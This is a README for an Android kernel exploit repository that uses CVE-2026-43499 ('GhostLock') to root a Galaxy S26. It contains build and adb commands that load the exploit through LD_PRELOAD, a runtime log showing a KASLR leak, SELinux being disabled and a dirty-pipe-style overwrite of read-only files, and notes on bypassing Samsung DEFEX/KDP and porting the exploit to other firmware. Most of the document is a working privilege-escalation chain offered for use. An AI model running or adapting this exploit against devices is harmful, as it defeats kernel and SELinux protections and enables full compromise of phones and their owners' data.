# GhostLock (CVE-2026-43499) for Galaxy S26
As of 2026-08-11, other exploits for GhostLock don't work on S26. This repo utilize another method (dirty-pipe like file overwrite) to port it to S26 kernel.

Dirty-pipe like method can easily bypass samsung DEFEX/KDP and doesn't rely on ashmem. It is suitable for 6.12 kernel Galaxy devices (Galaxy S26 series).

Currently only supports the following device.

| Payload | Compatible models | Kernel version | Status |
| --- | --- | --- | --- |
| `m1q-S942QOPU1AZDE` | Galaxy S26 | `6.12.30-android16-5-pe553c2c-abogkiS942QOPU1AZDE-4k` | Working |

For porting another device or another firmware version, modify target.h and rebuild it.

# Build
```sh
git clone (this repo)
cd (this repo)
cd IonStack/CVE-2026-43499/exploit
export ANDROID_NDK_HOME=(your ndk path)
make PROJECT=m1q-S942QOPU1AZDE
```

And, build ksud + kernelsu.ko using [this tree](https://github.com/polygraphene/KernelSU/tree/aab67974f1210cad94880ce1fdc14cf63f6e30e0) by [this instruction](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads/blob/61a543e206bf503b54ffb2ac8329c2cd1b99a695/kernelsu/README.md).
This tree contains [a patch from BuSung-dev/Root-My-Galaxy](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads/blob/61a543e206bf503b54ffb2ac8329c2cd1b99a695/kernelsu/patches/KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch) and 6.12 adaptation.

# Run
```sh
$ adb push $KERNELSU/target/aarch64-linux-android/release/ksud /data/local/tmp
$ adb push (this repo)/IonStack/CVE-2026-43499/exploit/build/m1q-S942QOPU1AZDE/bin/preload.so /data/local/tmp
$ adb shell env LD_PRELOAD=/data/local/tmp/preload.so sh
[00:21:20.908446] [+] preload starting pid=7117
[00:21:20.908963] [+] startup context pid=7117 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[00:21:20.908985] [+] startup limits pid=7117 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[00:21:20.908992] [+] build config pid=7117 label=m1q-S942QOPU1AZDE-pipe-flag slide=pselect main=pselect
[00:21:20.908999] [+] p0 profile pid=7117 phys_offset=0000000080000000 kernel_phys_load=00000000c7800000 delta=0000000047800000 slide_logger=ffffff8049d221c0 bootid_data=ffffff8049e4cf48 init_task=ffffff8049d2d040 root_tg=ffffff8049f63580 sysctl_bootid=ffffff804a092e70
[00:21:21.914421] [+] slide tracefs caller=ffffffe8c8903878 candidate=2848800000
[00:21:21.916789] [+] slide-kaslr-ok source=tracefs pid=7117 base=ffffffe8c8800000 slide=0000002848800000
[00:21:21.916865] [*] Start selinux. enforcing=1
[00:21:22.141319] [*] parameters cpu (16) mm_struct sz (500) mm slab order (3) thread cnt (8) collisions (4) mte disabled
...
[00:24:06.305903] [*] sched_setattr_tid exit
[00:24:07.251367] [*] pselect returned attempt=1 ret=2 errno=0 calls=1 success=1 delay=50000
[00:24:07.251440] [*] phase=3
[00:24:07.251463] [*] try_pipe_flags_stage called
[00:24:07.252023] [+] pipe overwrite succeeded.
[00:24:07.252079] [*] pselect route done calls=1 success=1 step=0 errno=0
[00:24:07.255419] [*] Executing setprop ctl.start vendor.modprobe
```
Then, install KernelSU Manager.

# Flow
1. Leak kaslr by tracefs
2. Disable selinux by vuln
3. Modify pipe flag by vuln (add `can_merge` flag)
4. Overwrite readonly file like dirty-pipe
5. Get root

# Acknowledgments
- [Nebula Security](https://github.com/NebuSec/CyberMeowfia): Vulnerability and original exploit
- [@JoinChang](https://github.com/JoinChang/ghostlock-oneplus): Idea for disabling selinux
- [@BuSung-dev](https://github.com/BuSung-dev/Root-My-Galaxy): Idea for bypassing security of Samsung DEFEX/KDP and good documentation for porting
- [@veritas501](https://github.com/veritas501/pipe-primitive): Idea for triggering dirty-pipe like behavior from kernel memory corruption

